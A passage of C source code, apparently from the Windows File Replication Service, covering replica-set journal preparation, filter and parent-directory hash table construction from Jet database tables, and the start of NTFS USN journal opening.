        // service before we have run at least this amount of time it will
        // appear that time has moved backwards.
        //
        DPRINT(1, ":S: WARNING: Setting FrsVsn - Current system Time has moved backwards from value in config record.\n");

        FileTimeToString((PFILETIME) &CurrentTime, TimeStr);
        DPRINT2(1, ":S: WARNING: CurrentTime is          (%08x %08x)  %s\n",
                PRINTQUAD(CurrentTime), TimeStr);

        FileTimeToString((PFILETIME) &ConfigRecord->FrsVsn, TimeStr);
        DPRINT2(1, ":S: WARNING: ConfigRecord->FrsVsn is (%08x %08x)  %s\n",
                PRINTQUAD(ConfigRecord->FrsVsn), TimeStr);

        CurrentTime = ConfigRecord->FrsVsn;
    }

    if ((CurrentTime + 2*MaxPartnerClockSkew) > pVme->FrsVsn) {
        pVme->FrsVsn = CurrentTime + 2*MaxPartnerClockSkew;

        DPRINT(3, ":S: Setting new pVme->FrsVsn to Current time + 2*MaxPartnerClockSkew\n");
    }

    FileTimeToString((PFILETIME) &pVme->FrsVsn, TimeStr);
    DPRINT2(3, ":S: pVme->FrsVsn is (%08x %08x)  %s\n", PRINTQUAD(pVme->FrsVsn), TimeStr);

    if (GlobSeqNum == QUADZERO) {
        //
        // Init the global sequence number with the above computed VSN to keep
        // it monotonically increasing.
        //
        EnterCriticalSection(&GlobSeqNumLock);
        GlobSeqNum = pVme->FrsVsn;
        LeaveCriticalSection(&GlobSeqNumLock);
    }

    UNLOCK_VME(pVme);


    Replica->pVme = pVme;

    return WStatus;
}




ULONG
JrnlPrepareService2(
    IN PTHREAD_CTX ThreadCtx,
    IN PREPLICA Replica
    )
/*++

Routine Description:

    Load the volume filter hash table with the DIRTable entries for
    this replica set.  Create the change order hash table for this replica
    set and add the REPLICA struct to the replica list for this volume.

    Enumerate through the IDTable and load the parent Fid Hash Table.

    Note: This function is called from the DB Service thread since we have
    to be able to pause the journal before the dir table enum can be done.


Arguments:

    ThreadCtx -- ptr to the thread context (could be from journal or DB thread)
    Replica - The replica set we are initializing.

Return Value:

    A Win32 error status.

--*/

{
#undef DEBSUB
#define DEBSUB  "JrnlPrepareService2:"

    JET_ERR              jerr, jerr1;

    JET_TABLEID          DIRTid;
    CHAR                 DIRTableName[JET_cbNameMost];
    PTABLE_CTX           DIRTableCtx;

    JET_TABLEID          IDTid;
    CHAR                 IDTableName[JET_cbNameMost];
    PTABLE_CTX           IDTableCtx;

    PREPLICA_THREAD_CTX  RtCtx;

    PCONFIG_TABLE_RECORD ConfigRecord;
    ULONG                ReplicaNumber;
    ULONG                WStatus;
    PVOLUME_MONITOR_ENTRY pVme;
    JET_TABLEID          FrsOpenTableSaveTid;   // for FrsOpenTableMacro DEBUG

    PFILTER_TABLE_ENTRY  FilterEntry;


    if (Replica == NULL) {
        return ERROR_INVALID_PARAMETER;
    }

    DPRINT1(5, ":S: JrnlPrepareService2 for %ws\n", Replica->ReplicaName->Name);


    ConfigRecord = (PCONFIG_TABLE_RECORD)Replica->ConfigTable.pDataRecord;
    pVme = Replica->pVme;

    //
    // Allocate the replica thread context so we can get the directory
    // filter table.  Link it to the Replic context list head.
    //
    RtCtx = FrsAllocType(REPLICA_THREAD_TYPE);
    FrsRtlInsertTailList(&Replica->ReplicaCtxListHead, &RtCtx->ReplicaCtxList);

    ReplicaNumber = Replica->ReplicaNumber;
    DIRTableCtx = &RtCtx->DIRTable;
    //
    // Open the DIR table.
    //
    jerr = DBS_OPEN_TABLE(ThreadCtx, DIRTableCtx, ReplicaNumber, DIRTableName, &DIRTid);
    CLEANUP1_JS(0, "++ DBS_OPEN_TABLE (%s) error:", DIRTableName, jerr, RETURN_INV_DATA);

    //
    // Walk through the DirTable and load the data into the Volume Filter Table
    // by calling JrnlInsertFilterEntry() for this Replica.
    // The Replica points to the VME and the VME points to the
    // volume filter table.
    //
    jerr = FrsEnumerateTable(ThreadCtx,
                             DIRTableCtx,
                             DFileGuidIndexx,
                             JrnlInsertFilterEntry,
                             Replica);
    if ((jerr != JET_errNoCurrentRecord)) {
        CLEANUP1_JS(0, "++ FrsEnumerateTable (%s) error:", DIRTableName, jerr, RETURN_INV_DATA);
    }

    //
    // Now that all the entries are in place, walk through the hash table and
    // construct the child lists for this ReplicaSet.  This is done as a
    // second pass since we can't be certain of the order in which the
    // entries come from the database.  First get the Child List Lock for the
    // Replica Set.
    //

    JrnlAcquireChildLock(Replica);
    WStatus = (ULONG)GhtEnumerateTable(pVme->FilterTable,
                                       JrnlFilterLinkChildNoError,
                                       Replica);
    if (!WIN_SUCCESS(WStatus)) {
        JrnlReleaseChildLock(Replica);
        DPRINT_WS(0, "Error from JrnlLinkChildren", WStatus);
        GHT_DUMP_TABLE(4, pVme->FilterTable);
        goto RETURN;
    }

    //
    // Go find the root entry for this Replica Set in the Filter Table.
    //
    FilterEntry = (PFILTER_TABLE_ENTRY) GhtEnumerateTable(pVme->FilterTable,
                                                          JrnlFilterGetRoot,
                                                          Replica);
    if (FilterEntry == NULL) {
        JrnlReleaseChildLock(Replica);
        DPRINT1(0, ":S: Error from JrnlFilterGetRoot. No Root for %d\n",
                Replica->ReplicaNumber);
        GHT_DUMP_TABLE(5, pVme->FilterTable);
        goto RETURN_INV_DATA;
    }

    //
    // Replay the inbound log table and update the volume filter table with
    // any directory changes.
    //
    // Note: Add code to replay the inbound log and update the filter table.
    // It may be better to handle this at startup when we are recovering the
    // staging areas.  But, the filter table may not exist yet.


#if DBG
    if (DoDebug(5, DEBSUB)) {
        DPRINT(5," >>>>>>>>>>>>>>> Top Down dump of Filter Tree <<<<<<<<<<<<<<<<\n");
        JrnlEnumerateFilterTreeTD(pVme->FilterTable,
                                  FilterEntry,
                                  JrnlSubTreePrint,
                                  Replica);
    }
#endif DBG

    JrnlReleaseChildLock(Replica);

    //
    // Build the Parent directory table.
    //

    IDTableCtx = &RtCtx->IDTable;
    //
    // Open the ID table.
    //
    jerr = DBS_OPEN_TABLE(ThreadCtx, IDTableCtx, ReplicaNumber, IDTableName, &IDTid);
    CLEANUP1_JS(0, "++ Building parent FID table (%s):", IDTableName, jerr, RETURN_INV_DATA);

    //
    // Walk through the IDTable and load the data into the Volume Parent Dir
    // Table by calling JrnlInsertParentEntry() for this Replica.
    // The Replica points to the VME and the VME points to the
    // parent dir table.
    //
    jerr = FrsEnumerateTable(ThreadCtx,
                             IDTableCtx,
                             GuidIndexx,
                             JrnlInsertParentEntry,
                             Replica);
    if ((jerr != JET_errNoCurrentRecord)) {
        CLEANUP1_JS(0, "++ FrsEnumerateTable (%s) error:", IDTableName, jerr, RETURN_INV_DATA);
    }
    //
    // Replay the inbound log table and update the volume Parent Dir table
    // for any file creates, deletes or renames.
    //
    // Note: Add code to replay the inbound log and update the Parent Dir table.
    // It may be better to handle this at startup when we are recovering the
    // staging areas.  But, the filter table may not exist yet.
    //
    // Add the replica struct to the list of replica sets served by this
    // volume journal.
    //
    if (AcquireVmeRef(pVme) == 0) {
        WStatus = ERROR_OPERATION_ABORTED;
        goto RETURN;
    }

    /////////////////////////////////////////////////

    //
    // Start the first read on the volume.  Check first if it is PAUSED and
    // set state to starting.  If this is the first replica set on the volume
    // the state will be INITIALIZING and we leave that alone so additional
    // journal buffers get allocated.
    //
    // pVme = Replica->pVme;
    if (pVme->JournalState != JRNL_STATE_INITIALIZING) {
        if (pVme->JournalState == JRNL_STATE_PAUSED) {
            SET_JOURNAL_AND_REPLICA_STATE(pVme, JRNL_STATE_STARTING);
        } else {
            DPRINT2(0, "++ ERROR - Journal for %ws is in an unexpected state: %s\n",
                    Replica->ReplicaName->Name, RSS_NAME(pVme->JournalState));
            SET_JOURNAL_AND_REPLICA_STATE(pVme, JRNL_STATE_ERROR);
            WStatus = ERROR_OPERATION_ABORTED;
            goto RETURN;
        }
    }

    //
    // Initialize the LastUsnRecordProcessed for this replica set to the value
    // saved in the config record or the value from the Inlog record with the
    // largest USN so we don't reprocess them.  If we end up reading (replaying)
    // the journal at an earlier point to let another replica set catch up we
    // need to ignore those old records.  If LastShutdown or FSVolLastUSN is 0
    // then this is the very first time we have started replication on this
    // replica set so set the FSVolLastUSN and LastUsnRecordProcessed to the
    // current journal read point, pVme->JrnlReadPoint.
    //
    if ((ConfigRecord->LastShutdown == 0) ||
        (ConfigRecord->FSVolLastUSN == 0)) {

        if (!(ConfigRecord->ServiceState == CNF_SERVICE_STATE_CREATING)) {
            DPRINT2(0, ":S: BETA ERROR - Service state is %d; not _CREATING for %ws\n",
                    ConfigRecord->ServiceState, Replica->ReplicaName->Name);
        }
        ConfigRecord->FSVolLastUSN = pVme->JrnlReadPoint;
        Replica->LastUsnRecordProcessed = pVme->JrnlReadPoint;
        DPRINT1(4, ":S: Replica->LastUsnRecordProcessed is: %08x %08x\n", PRINTQUAD(Replica->LastUsnRecordProcessed));
    } else {

        //
        // Start where we left off and minimize with any other replicas.
        //
        Replica->LastUsnRecordProcessed = ConfigRecord->FSVolLastUSN;
        DPRINT1(4, ":S: Replica->LastUsnRecordProcessed is: %08x %08x\n", PRINTQUAD(Replica->LastUsnRecordProcessed));

        //
        // Advance to largest USN of Inlog record.
        //
        if (Replica->JrnlRecoveryStart > Replica->LastUsnRecordProcessed) {
            Replica->LastUsnRecordProcessed = Replica->JrnlRecoveryStart;
            DPRINT1(4, ":S: Replica->LastUsnRecordProcessed is: %08x %08x (JrnlRecoveryStart > LastUsnRecordProcessed)\n",
                    PRINTQUAD(Replica->LastUsnRecordProcessed));
        }

        //
        // start at the earliest USN of any replica set on the volume.
        // If the journal is active it is currently using JrnlReadPoint to
        // track its current read point.  Since we may be starting a replica
        // set on an active volume ReplayUsn is used to save the starting
        // point.  After the volume is paused and then unpaused ReplayUsn
        // is copied to JrnlReadPoint where the journal will start reading.
        //
        if (pVme->ReplayUsnValid) {
            DPRINT1(4, ":S: ReplayUsn was: %08x %08x\n", PRINTQUAD(pVme->ReplayUsn));
            pVme->ReplayUsn = min(Replica->LastUsnRecordProcessed, pVme->ReplayUsn);
        } else {
            DPRINT(4, ":S: No ReplayUsn was active.\n");
            pVme->ReplayUsn = Replica->LastUsnRecordProcessed;
            pVme->ReplayUsnValid = TRUE;
        }
        DPRINT1(4, ":S: ReplayUsn  is: %08x %08x\n", PRINTQUAD(pVme->ReplayUsn));

    }

    //
    // Init the inlog commit point so if we shutdown the saved value is correct.
    //
    Replica->InlogCommitUsn = Replica->LastUsnRecordProcessed;
    DPRINT1(4, ":S: Replica->InlogCommitUsn: %08x %08x\n",
            PRINTQUAD(Replica->InlogCommitUsn));

    //
    // Track the oldest USN save point and the most recent USN progress point
    // for any replica set on the volume.
    //
    if ((pVme->LastUsnSavePoint == (USN)0) ||
        (pVme->LastUsnSavePoint > Replica->LastUsnRecordProcessed)) {
        pVme->LastUsnSavePoint = Replica->LastUsnRecordProcessed;
    }

    if (pVme->MonitorMaxProgressUsn < Replica->LastUsnRecordProcessed) {
        pVme->MonitorMaxProgressUsn = Replica->LastUsnRecordProcessed;
    }


    //
    // This replica's FrsVsn may be out of date by a large margin
    // if it has been awhile since the set was last started successfully.
    // This results in an assert in DbsReplicaSaveMark(). So, as
    // long as the FrsVsns look sane, assign the volume's current
    // Vsn to the replica set.
    //
    FRS_ASSERT(pVme->FrsVsn >= ConfigRecord->FrsVsn);
    ConfigRecord->FrsVsn = pVme->FrsVsn;

    /////////////////////////////////////////////////

    InitializeListHead(&Replica->RecoveryRefreshList);
    InterlockedIncrement(&Replica->ReferenceCount);
    pVme->ActiveReplicas += 1;
    FrsRtlInsertTailList(&pVme->ReplicaListHead, &Replica->VolReplicaList);

    WStatus = ERROR_SUCCESS;

RETURN:
    //
    // Close the replica tables and release the RtCtx struct.
    //
    DbsFreeRtCtx(ThreadCtx, Replica, RtCtx, TRUE);

    return WStatus;

RETURN_INV_DATA:

    DbsFreeRtCtx(ThreadCtx, Replica, RtCtx, TRUE);
    return (jerr == JET_errTermInProgress) ? ERROR_OPERATION_ABORTED : ERROR_INVALID_DATA;
}



JET_ERR
JrnlInsertParentEntry(
    IN PTHREAD_CTX   ThreadCtx,
    IN PTABLE_CTX    TableCtx,
    IN PVOID         Record,
    IN PVOID         Context
)
/*++

Routine Description:

    This is a worker function passed to FrsEnumerateTable().  Each time
    it is called with an IDTable record it save the parent info in the
    Parent Directory Table for the volume.

Arguments:

    ThreadCtx - Needed to access Jet.
    TableCtx  - A ptr to an IDTable context struct.
    Record    - A ptr to a IDTable record.
    Context   - A ptr to a Replica struct.

Thread Return Value:

    A Jet error status.  Success means call us with the next record.
    Failure means don't call again and pass our status back to the
    caller of FrsEnumerateTable().

--*/
{
#undef DEBSUB
#define DEBSUB "JrnlInsertParentEntry:"

    ULONGLONG   SystemTime;
    ULONGLONG   ExpireTime;

    JET_ERR jerr;
    ULONG GStatus;

    PIDTABLE_RECORD IDTableRec = (PIDTABLE_RECORD) Record ;

    PQHASH_TABLE HashTable = ((PREPLICA) Context)->pVme->ParentFidTable;

    //
    // Abort enum if shutting down.
    //
    if (FrsIsShuttingDown) {
        return JET_errTermInProgress;
    }

    //
    // Check for expired tombstones.
    //
    if (IsIdRecFlagSet(IDTableRec, IDREC_FLAGS_DELETED)) {

        GetSystemTimeAsFileTime((PFILETIME)&SystemTime);
        COPY_TIME(&ExpireTime, &IDTableRec->TombStoneGC);

        if ((ExpireTime < SystemTime) && (ExpireTime != QUADZERO)) {

            //
            // IDTable record has expired.  Delete it.
            // If there is a problem, complain but keep going.
            //
            jerr = DbsDeleteTableRecord(TableCtx);
            DPRINT_JS(0, "ERROR - DbsDeleteTableRecord :", jerr);
            return JET_errSuccess;
        }
    }

    //
    // Include the entry if replication is enabled and not marked for deletion
    // and not a new file being created when we last shutdown.
    //
    if (IDTableRec->ReplEnabled &&
        !IsIdRecFlagSet(IDTableRec, IDREC_FLAGS_DELETED) &&
        !IsIdRecFlagSet(IDTableRec, IDREC_FLAGS_NEW_FILE_IN_PROGRESS)) {

        if (IDTableRec->FileID == ZERO_FID) {
            //
            // We shouldn't see any records with a zero FID but some prior
            // bugs could cause this to happen.  Dump em out but don't try
            // to insert into table since it will assert.
            //
            DPRINT(0, "++ WARNING -- IDTable record with zero FID found.\n");
            DBS_DISPLAY_RECORD_SEV(0, TableCtx, TRUE);

        } else {

            GStatus = QHashInsert(HashTable,
                                  &IDTableRec->FileID,
                                  &IDTableRec->ParentFileID,
                                  ((PREPLICA) Context)->ReplicaNumber,
                                  FALSE);
            if (GStatus != GHT_STATUS_SUCCESS ) {
                DPRINT1(0, "++ QHashInsert error: %d\n", GStatus);
            }
        }
    }


    //
    // Return success so we can keep going thru the ID table.
    //
    return JET_errSuccess;
}



ULONG_PTR
JrnlFilterLinkChild (
    PGENERIC_HASH_TABLE Table,
    PVOID Buffer,
    PVOID Context
    )
/*++

Routine Description:

    This function is called thru GhtEnumerateTable() to connect this
    filter table entry to the parent list for the replica set passed in
    Context.  The GhtEnumerateTable function does not acquire any row locks
    so this function is free to call GhtLookup or GhtInsert without deadlock
    conflicts.  It is assumed that the caller knows that it is safe to
    enumerate the table.  The caller is also responsible for getting the
    child list lock for the replica set before calling GhtEnumerateTable().

    The child list lock is associated with the replica set so when you have
    the lock the child list entries for all filter entries in this replica
    set are protected.  When we enumerate down a subtree we only need to get
    one lock.

    WARNING - There is no table level lock on the Filter Table.  The Filter
    table is per volume so multiple replica sets could be using the same
    table.  The locking is at the row level where the row is indexed by
    the hash function.  This means that this function can only be used
    when the Journal is paused.  To start/add a replica set after the
    system is running you must pause the journal, update the filter table
    and then unpause the journal.

Arguments:

    Table - the hash table being enumerated (to lookup parent entry).
    Buffer - a ptr to a FILTER_TABLE_ENTRY
    Context - A pointer to the Replica struct for the replica data added to the
              table.

Return Value:

    A Win32 error status.  A failure status return aborts enumeration.

--*/

{
#undef DEBSUB
#define DEBSUB  "JrnlFilterLinkChild:"

    PFILTER_TABLE_ENTRY FilterEntry = (PFILTER_TABLE_ENTRY) Buffer;
    PREPLICA Replica = (PREPLICA) Context;

    PFILTER_TABLE_ENTRY ParentFilterEntry;
    ULONG GStatus;

    //
    // Skip entry if it is not associated with the replica set of interest.
    //
    if (FilterEntry->Replica != Replica) {
        return ERROR_SUCCESS;
    }

    //
    // If this is the root of the replica tree there is no parent to link it to.
    //
    if (FilterEntry->DParentFileID == ZERO_FID) {
        return ERROR_SUCCESS;
    }

    //
    // If this entry has already been linked then return an error status to
    // abort the enumeration since the entry can't be on more than one list.
    //
    if (FilterEntry->ChildEntry.Flink != NULL) {
        return ERROR_GEN_FAILURE;
    }

    //
    // Find the parent to link this child to.
    //
    GStatus = GhtLookup(Table,
                        &FilterEntry->DParentFileID,
                        TRUE,
                        &ParentFilterEntry);

    if (GStatus != GHT_STATUS_SUCCESS) {
        DPRINT1(0, "++ Error: Parent entry not found for - %08x\n", FilterEntry);
        FRS_JOURNAL_FILTER_PRINT(0, Table, FilterEntry);
        return ERROR_GEN_FAILURE;
    }

    //
    // Put the Dir on the list and drop the ref count we got from Lookup.
    //
    InsertHeadList(&ParentFilterEntry->ChildHead, &FilterEntry->ChildEntry);

    GhtDereferenceEntryByAddress(Table, ParentFilterEntry, TRUE);

    return ERROR_SUCCESS;
}



ULONG_PTR
JrnlFilterLinkChildNoError(
    PGENERIC_HASH_TABLE Table,
    PVOID Buffer,
    PVOID Context
    )
/*++

Routine Description:

    See JrnlFilterLinkChild().

    A dirtable entry may appear to be orphaned if it is stuck in the
    preinstall area and its parent has been deleted. Ignore errors
    for now.

    This can also happen if a remote co create is executed for a dir at the
    same time the subtree containing this dir is being moved out of the
    replica tree.  The journal code will remove the filter entries immediately
    so we skip future file changes in the subtree.  So the parent is gone when
    the filter entry for the dir create is added.  In the course of processing
    the moveout on the parent this dir entry is cleaned up.

Arguments:

    Table - the hash table being enumerated (to lookup parent entry).
    Buffer - a ptr to a FILTER_TABLE_ENTRY
    Context - A pointer to the Replica struct for the replica data added to the
              table.

Return Value:

    ERROR_SUCCESS

--*/

{
#undef DEBSUB
#define DEBSUB  "JrnlFilterLinkChildNoError:"
    ULONG WStatus;

    WStatus = (ULONG)JrnlFilterLinkChild(Table, Buffer, Context);

    DPRINT_WS(0, "++ WARN - orphaned dir; probably stuck in preinstall with deleted parent", WStatus);

    return ERROR_SUCCESS;
}



ULONG
JrnlFilterUnlinkChild (
    PGENERIC_HASH_TABLE Table,
    PVOID Buffer,
    PVOID Context
    )
/*++

Routine Description:

    This function is unlinks a filter entry from the child list.

    The caller must get the child list lock for the replica set.
    The child list lock is associated with the replica set so when you have
    the lock the child list entries for all filter entries in this replica
    set are protected.  When we enumerate down a subtree we only need to get
    one lock.


Arguments:

    Table - the hash table being enumerated (to lookup parent entry).
    Buffer - a ptr to a FILTER_TABLE_ENTRY
    Context - A pointer to the Replica struct for the replica data added to the
              table.

Return Value:

    A Win32 error status.  A failure status return aborts enumeration.

--*/

{
#undef DEBSUB
#define DEBSUB  "JrnlFilterUnlinkChild:"

    PFILTER_TABLE_ENTRY FilterEntry = (PFILTER_TABLE_ENTRY) Buffer;
    PREPLICA Replica = (PREPLICA) Context;

    PFILTER_TABLE_ENTRY ParentFilterEntry;
    ULONG GStatus;

    //
    // Skip entry if it is not associated with the replica set of interest.
    // Return error_success so this function can be called by GhtEnumerateTable().
    //
    if (FilterEntry->Replica != Replica) {
        return ERROR_SUCCESS;
    }

    //
    // If this entry is not on the list then return an error status to
    // abort the enumeration.
    //
    if (FilterEntry->ChildEntry.Flink == NULL) {
        return ERROR_GEN_FAILURE;
    }

    //
    // Pull the entry off the list.
    //
    FrsRemoveEntryList(&FilterEntry->ChildEntry);

    FilterEntry->ChildEntry.Flink = NULL;
    FilterEntry->ChildEntry.Blink = NULL;

    return ERROR_SUCCESS;
}



ULONG_PTR
JrnlFilterGetRoot (
    PGENERIC_HASH_TABLE Table,
    PVOID Buffer,
    PVOID Context
    )
/*++

Routine Description:

    This function is called thru GhtEnumerateTable() to find the root
    of the replica set specified by the Context parameter.

Arguments:

    Table - the hash table being enumerated (to lookup parent entry).
    Buffer - a ptr to a FILTER_TABLE_ENTRY
    Context - A pointer to the Replica struct for the replica data added to the
              table.

Return Value:

    The root filter entry for the Replica Set, else NULL to keep looking.

--*/

{
#undef DEBSUB
#define DEBSUB  "JrnlFilterGetRoot:"

    PFILTER_TABLE_ENTRY FilterEntry = (PFILTER_TABLE_ENTRY) Buffer;
    PREPLICA Replica = (PREPLICA) Context;

    //
    // Skip entry if it is not associated with the replica set of interest.
    //
    if (FilterEntry->Replica != Replica) {
        return (ULONG_PTR)NULL;
    }

    //
    // If this is the root of the replica tree we're done.
    //
    if (FilterEntry->DParentFileID == ZERO_FID) {
        return (ULONG_PTR)FilterEntry;
    }

    return (ULONG_PTR)NULL;
}


ULONG
JrnlSubTreePrint (
    PGENERIC_HASH_TABLE Table,
    PVOID Buffer,
    PVOID Context
    )
/*++

Routine Description:

    This function is called thru GhtEnumerateTable() to dump a Filter entry.

    The enum caller takes a ref on the entry.  we drop it here.

Arguments:

    Table - the hash table being enumerated (to lookup parent entry).
    Buffer - a ptr to a FILTER_TABLE_ENTRY
    Context - A pointer to the Replica struct for the replica data added to the
              table.

Return Value:

    Win32 status

--*/

{
#undef DEBSUB
#define DEBSUB  "JrnlSubTreePrint:"

    PFILTER_TABLE_ENTRY FilterEntry = (PFILTER_TABLE_ENTRY) Buffer;
    PREPLICA Replica = (PREPLICA) Context;


    //
    // Abort enum if shutting down.
    //
    if (FrsIsShuttingDown) {
        return ERROR_OPERATION_ABORTED;
    }

    //
    // print the entry if it is associated with the replica set of interest.
    //
    if (FilterEntry->Replica == Replica) {
        FRS_JOURNAL_FILTER_PRINT(4, Table, FilterEntry);
    }

    DECREMENT_FILTER_REF_COUNT(FilterEntry);

    return ERROR_SUCCESS;
}

BOOL
ActiveChildrenKeyMatch(
    PVOID Buf,
    PVOID QKey
)
/*++

Routine Description:
    Check for an exact key match.

Arguments:
    Buf -- ptr to a Guid1.
    QKey -- ptr to Guid2.

Return Value:
    TRUE if exact match.

--*/
{
#undef DEBSUB
#define DEBSUB  "ActiveChildrenKeyMatch:"

    PULONG pUL1, pUL2;

    pUL1 = (PULONG) Buf;
    pUL2 = (PULONG) QKey;

    if (!ValueIsMultOf4(pUL1)) {
        DPRINT2(0, "ERROR - Unaligned key value - addr: %08x, Data: %08x\n", pUL1, *pUL1);
        FRS_ASSERT(ValueIsMultOf4(pUL1));
        return 0xFFFFFFFF;
    }
    if (!ValueIsMultOf4(pUL2)) {
        DPRINT2(0, "ERROR - Unaligned key value - addr: %08x, Data: %08x\n", pUL2, *pUL2);
        FRS_ASSERT(ValueIsMultOf4(pUL2));
        return 0xFFFFFFFF;
    }

    return GUIDS_EQUAL(pUL1, pUL2);
}


ULONG
ActiveChildrenHashCalc(
    PVOID Buf,
    PULONGLONG QKey
)
/*++

Routine Description:
    Calculate a hash value for the file guid used in the ActiveChildren Table.

Arguments:
    Buf -- ptr to a Guid.
    QKey -- Returned 8 byte hash key for the QKey field of QHASH_ENTRY.

Return Value:
    32 bit hash value.

--*/
{
#undef DEBSUB
#define DEBSUB  "ActiveChildrenHashCalc:"

    PULONG  pUL = (PULONG) Buf;
    PUSHORT pUS = (PUSHORT) Buf;

    if (!ValueIsMultOf4(pUL)) {
        DPRINT2(0, "ERROR - Unaligned key value - addr: %08x, Data: %08x\n", pUL, *pUL);
        FRS_ASSERT(ValueIsMultOf4(pUL));
        return 0xFFFFFFFF;
    }

    //
    // Calc QKey, 4 byte hash is ok.
    //
    *QKey = (ULONGLONG) (pUL[0] ^ pUL[1] ^ pUL[2] ^ pUL[3]);

    //
    // Calc hash based on the time.  Include node part for remote COs.
    //
    return (ULONG) (pUS[0] ^ pUS[1] ^ pUS[2] ^ pUS[6] ^ pUS[7]);
}


ULONG
JrnlOpen(
    IN PREPLICA Replica,
    OUT PVOLUME_MONITOR_ENTRY *pVmeArg,
    PCONFIG_TABLE_RECORD ConfigRecord
    )
/*++

Routine Description:

    This routine opens the journal specified by the Replica->Volume parameter.
    It creates and fills in a Volume monitor entry that can
    be used to read the NTFS Journal.  It checks if objects and object IDs
    are supported on the volume and fails if they aren't.  It checks for an
    object ID on the root directory of the volume and puts one there if necessary.

    It keeps a list of volumes (VolumeMonitorQueue) that currently have journal
    files open. If it finds this request in the list it bumps the ref count
    and returns.  pVme is set to NULL with status success indicating I/O
    on the journal is proceeding.

    If this volume is not in the list then it is added.  The volume Object ID
    is used to identify the volume in the Volume Monitor list.  A read
    is not posted to the journal at this time.  This allows journal opens for
    other replica sets to be done so we start out at the lowest USN of all
    replica sets hosted by a given volume.  In addition we need to know about
    all current replica sets when we start filtering journal entries.

    The volume monitor entry related to to the given replica set is
    returned in pVme.  If we fail to open the journal pVmeArg is NULL
    and status indicates the failure.

    If the journal doesn't exist it is created.  The max size is set to
    JRNL_DEFAULT_MAX_SIZE MB with an allocation size of
    JRNL_DEFAULT_ALLOC_DELTA MB.

    The following checks are made to make sure that the volume and journal
    info is not changed while the service was not running.

    VOLUME ROOT OBJECTID MISMATCH CHECK:
        In case of a mismatch the information in the Db is updated with the
        correct value for the volume guid.

    JOURNAL ID MISMATCH CHECK:
        In case of a mismatch the replica set is marked to be deleted.



Arguments:

    Replica:  Replica being opened

    pVmeArg:  A pointer to return the Volume Monitor Entry in.

    ConfigRecord:  The ConfigTqable record for this replica set.


Return Value:

    Win32 status


--*/

{
#undef DEBSUB
#define DEBSUB  "JrnlOpen:"

    USN_JOURNAL_DATA             UsnJournalData;
    CREATE_USN_JOURNAL_DATA      CreateUsnJournalData = {
                                    0,                       // MaximumSize from registry
                                    JRNL_DEFAULT_ALLOC_DELTA // AllocationDelta
                                 };
    IO_STATUS_BLOCK              Iosb;
    ULONG                        JournalSize;
    NTSTATUS                     Status;
    DWORD                        WStatus;
    ULONG                        BytesReturned;
    PVOLUME_MONITOR_ENTRY        pVme;
    HANDLE                       RootHandle;
    HANDLE                       VolumeHandle                = INVALID_HANDLE_VALUE;
    ULONG                        VolumeInfoLength;
    PFILE_FS_VOLUME_INFORMATION  VolumeInfo;
    FILE_OBJECTID_BUFFER         ObjectIdBuffer;
    PLIST_ENTRY                  Entry;
    WCHAR                        VolumeRootDir[MAX_PATH + 1];
    CHAR                         GuidStr[GUID_CHAR_LEN];
    CHAR                         TimeString[TIME_STRING_LENGTH];
    CHAR                         HashTableName[40];
    PCOMMAND_PACKET              CmdPkt = NULL;
    HANDLE                       DummyHandle = INVALID_HANDLE_VALUE;
    ULARGE_INTEGER               FreeBytesAvailableToCaller;
    ULARGE_INTEGER               TotalNumberOfBytes;

    *pVmeArg = NULL;

    //
    // Does the volume exist and is it NTFS?
    //
    WStatus = FrsVerifyVolume(Replica->Volume,
                              Replica->SetName->Name,
                              FILE_PERSISTENT_ACLS | FILE_SUPPORTS_OBJECT_IDS);
    if (!WIN_SUCCESS(WStatus)) {
        DPRINT2_WS(3, ":S: JrnlOpen - Root path Volume (%ws) for %ws does not exist or is not NTFS;",
                   Replica->Volume, Replica->SetName->Name, WStatus);
        Replica->FStatus = FrsErrorVolumeRootDirOpenFail;
        return WStatus;
    }

    //
    // "\\.\" is used as an escape prefix to prevent the name translator
    // from appending a trailing "\" on a drive letter.  Need to do a volume open.
    //  \\.\E:   gets mapped to E:  (really an NT internal device name)
    //  \\.\E:\  gets mapped to E:\
    //  E:       gets mapped to E:\
    //  E:\      gets mapped to E:\
    //

    //
    //  Get a volume handle.
    //
    _wcsupr( Replica->Volume );
    VolumeHandle = CreateFile(Replica->Volume,
                              GENERIC_READ | GENERIC_WRITE,
                              FILE_SHARE_READ | FILE_SHARE_WRITE,
                              NULL,
                              OPEN_EXISTING,
                              FILE_ATTRIBUTE_NORMAL,
                              NULL );

    if (!HANDLE_IS_VALID(VolumeHandle)) {
        WStatus = GetLastError();
        DPRINT1_WS(0, "++ ERROR - JrnlOpen: Unable to open %ws volume :",
                   Replica->Volume, WStatus);
        Replica->FStatus = FrsErrorVolumeRootDirOpenFail;
        return WStatus;
    } else {
        WStatus = GetLastError();
        DPRINT1_WS(4, "++ JrnlOpen: Open on volume %ws :", Replica->Volume, WStatus);
    }

    //
    // Get the volume information.
    //
    pVme = FrsAllocType(VOLUME_MONITOR_ENTRY_TYPE);
    pVme->FrsVsn = QUADZERO;
    pVme->ReplayUsnValid = FALSE;


    VolumeInfoLength = sizeof(FILE_FS_VOLUME_INFORMATION) +
                       MAXIMUM_VOLUME_LABEL_LENGTH;

    VolumeInfo = &pVme->FSVolInfo;

    Status = NtQueryVolumeInformationFile(VolumeHandle,
                                          &Iosb,
                                          VolumeInfo,
                                          VolumeInfoLength,
                                          FileFsVolumeInformation);
    if ( NT_SUCCESS(Status) ) {

        VolumeInfo->VolumeLabel[VolumeInfo->VolumeLabelLength/2] = UNICODE_NULL;
        FileTimeToString((PFILETIME) &VolumeInfo->VolumeCreationTime, TimeString);

        DPRINT5(4,":S: %-16ws (%d), %s, VSN: %08X, VolCreTim: %s\n",
                VolumeInfo->VolumeLabel,
                VolumeInfo->VolumeLabelLength,
                (VolumeInfo->SupportsObjects ? "(obj)" : "(no-obj)"),
                VolumeInfo->VolumeSerialNumber,
                TimeString);

        if (!VolumeInfo->SupportsObjects) {
            //
            // No object support on the volume.
            //
            EPRINT4(EVENT_FRS_VOLUME_NOT_SUPPORTED,
                    Replica->SetName->Name, ComputerName, Replica->Root, Replica->Volume);
            DPRINT(0, ":S: ERROR - Object IDs are not supported on the volume.\n");
            pVme = FrsFreeType(pVme);
            FRS_CLOSE(VolumeHandle);
            Replica->FStatus = FrsErrorUnsupportedFileSystem;
            return FrsSetLastNTError(STATUS_NOT_IMPLEMENTED);
        }

        //
        // Scan the VolumeMonitorStopQueue to see if we already tried
        // this one and failed.
        //

